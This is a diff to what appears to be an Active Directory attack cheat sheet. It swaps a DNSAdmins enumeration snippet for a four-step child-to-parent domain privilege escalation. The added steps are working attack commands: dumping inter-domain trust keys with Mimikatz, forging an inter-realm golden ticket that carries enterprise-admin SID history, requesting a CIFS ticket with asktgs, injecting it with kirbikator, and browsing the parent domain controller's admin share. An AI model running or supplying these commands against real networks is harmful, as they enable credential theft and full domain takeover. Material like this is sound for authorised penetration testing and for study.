@@ -562,13 +562,26 @@ Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 
 ### Child to Parent using Trust Tickets
 
-**1. Enumeration with Powerview:**
+**1. Look for [In] trust key from child to parent:**
 ```powershell
-# Enumerate the members of the DNSAdmis group
-Get-NetGroupMember -GroupName "DNSAdmins"          
+# Look for [In] trust key from child to parent
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'      
 ```
-**2. With AD Module:**
+**2. Create the inter-realm TGT:**
 ```powershell
-# Enumerate the members of the DNSAdmis group
-Get-ADGroupMember -Identity DNSAdmins
+# Create the inter-realm TGT
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:<hash> /service:krbtgt /target:<domain> /ticket:C:\<directory>\trust_tkt.kirbi"'
+```
+**3. Get a TGS for a service in the target domain by using the
+forged trust ticket.:**
+```powershell
+# Get a TGS for a service (CIFS below)
+.\asktgs.exe C:\<directory>\trust_tkt.kirbi CIFS/mcorp-dc.corporate.local
+```
+**4. Use the TGS to access the targeted service and check:**
+```powershell
+# Use the TGS
+.\kirbikator.exe lsa .\CIFS.mcorp-dc.corporate.local.kirbi
+# Check
+ls \\mcorp dc.corporate.local\c$
 ```
